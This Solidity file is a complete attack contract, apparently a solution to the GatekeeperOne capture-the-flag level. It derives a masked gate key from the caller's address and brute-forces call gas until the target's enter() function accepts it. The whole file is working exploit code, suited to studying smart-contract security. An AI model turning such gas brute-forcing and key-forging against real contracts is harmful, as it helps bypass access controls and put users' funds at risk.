// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "hardhat/console.sol";

interface IGatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperOneAttack {

  IGatekeeperOne targetContract;
  address public attacker;

  constructor(address _targetAddr) public {
    targetContract = IGatekeeperOne(_targetAddr);
    attacker = msg.sender;
  }

  modifier myHack() {
    require(msg.sender == attacker, "My hack!");
    _;
  }

  function enterGate(uint256 _lowerGasBrute, uint256 _upperGasBrute) public myHack returns (bool _success) {
    bytes8 key = bytes8(uint64(msg.sender) & 0xFFFFFFFF0000FFFF);

    uint256 gasBrute;
    for(gasBrute = _lowerGasBrute; gasBrute <= _upperGasBrute; gasBrute++){
        (_success, ) = address(targetContract).call.gas(gasBrute + (8191 * 3))(
            abi.encodeWithSignature("enter(bytes8)", key)
        );
        if(_success){
            return _success;
        }
    }        
  }
}